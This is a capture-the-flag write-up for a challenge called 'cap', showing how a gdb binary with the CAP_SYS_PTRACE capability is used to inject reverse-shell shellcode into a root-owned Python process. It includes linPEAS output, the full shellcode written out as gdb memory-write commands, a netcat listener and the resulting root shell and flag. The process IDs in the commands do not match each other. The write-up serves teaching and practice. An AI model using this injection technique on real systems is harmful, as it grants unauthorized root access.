## cap - writeup


## Enumeration
This is privilege escalation challenge, that as the name suggests, involves linux capabilities.
You can search for files that have additional capabilities set with ```getcap```, or for more complex automated enumeration, you can upload the [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) script via ```scp```:

```bash
scp -P <port> <linpeas path on your machine> bts-bob@<ip>:/home/bts-bob/linpeas.sh
```

Snippet from linpeas.sh output on target machine: 
```bash
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x00000000a80c25fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x00000000a80c25fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/gdb cap_sys_ptrace=eip

```

As you can see, ```gdb``` has [CAP_SYS_PTRACE](https://man7.org/linux/man-pages/man7/capabilities.7.html) set. That means that it can debug arbitrary processes. We need to find a process that we will hijack with the debugger. Lets see what is running inside our Docker container:

```bash
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 13:50 ?        00:00:00 /bin/bash ./entrypoint.sh
root           7       1  0 13:50 ?        00:00:00 /bin/bash ./challenge_manager.sh
root           8       1  0 13:50 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root          10       8  0 13:51 ?        00:00:00 sshd: bts-bob [priv]
bts-bob          12      10  0 13:51 ?        00:00:00 sshd: bts-bob@pts/0
bts-bob          13      12  0 13:51 pts/0    00:00:00 -bash
root          15       8  0 13:52 ?        00:00:00 sshd: bts-bob [priv]
bts-bob          17      15  0 13:52 ?        00:00:00 sshd: bts-bob@pts/1
bts-bob          18      17  0 13:52 pts/1    00:00:00 -bash
bts-bob          47      13  0 13:54 pts/0    00:00:00 gdb -p 44 -x commands.txt
root         116       7  0 15:01 ?        00:00:00 python ./very_important_script.py
bts-bob         117      18  0 15:01 pts/1    00:00:00 ps -eaf
```
There is a ```python``` process started by ```root```. We will use ```gdb``` to write shellcode at the current instruction pointer, and then resume execution of the process - it will execute our instructions and give us root access.

Lets format our shellcode, so we can pass it as ```gdb``` commands. The shellcode used in this writeup is from [Packet Storm](https://packetstormsecurity.com/files/160996/Linux-x64-Reverse-Shell-Shellcode.html) and python script converting it to gdb commands is adopted from [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace).
I saved the output to the ```commands.txt``` file

```bash
set {long}($rip+0) = 0x58296a9090909090
set {long}($rip+8) = 0x0f995e016a5f026a  
set {long}($rip+16) = 0x01017f68525f5005 
set {long}($rip+24) = 0x026a665c11686601 
set {long}($rip+32) = 0x5a106a5e54582a6a 
set {long}($rip+40) = 0x58216a5e026a050f 
set {long}($rip+48) = 0x6af679ceff48050f 
set {long}($rip+56) = 0x73736150b9495801 
set {long}($rip+64) = 0x5e545141203a6477 
set {long}($rip+72) = 0xc03148050f5a086a 
set {long}($rip+80) = 0xb848050f08c68348 
set {long}($rip+88) = 0x3837363534333231 
set {long}($rip+96) = 0x3b6a1a75af485f56 
set {long}($rip+104) = 0x69622fbb48529958
set {long}($rip+112) = 0x5f545368732f2f6e
set {long}($rip+120) = 0x050f5e54575a5452
```

Before attaching (and this is specific to this shellcode), we have to create a second SSH connection and start the listener for the reverse shell with 

```bash
nc -lvp 4444
```

In the first connection, attach to the python process and execute the commands

```bash
gdb -p 114 -x commands.txt
```

Continue the execution
```bash
GNU gdb (GDB) 14.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-alpine-linux-musl".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 116

warning: opening /proc/PID/mem file for lwp 116.116 failed: Permission denied (13)
Reading symbols from /usr/bin/python3.11...
(No debugging symbols found in /usr/bin/python3.11)

warning: opening /proc/self/mem file failed: Permission denied (13)
Reading symbols from /lib/ld-musl-x86_64.so.1...
Reading symbols from /usr/lib/debug//lib/ld-musl-x86_64.so.1.debug...
0x00007fd1c56e1862 in _dlstart () from /lib/ld-musl-x86_64.so.1
(gdb) c
Continuing.
```

And get the flag :D
```bash
db0c6d1515a8:~$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on localhost 39420
Passwd: 12345678
whoami
root
pwd
/root
cat flag.txt
BtSCTF{gdbussin_fr_fr_no_cap_7843477187}
```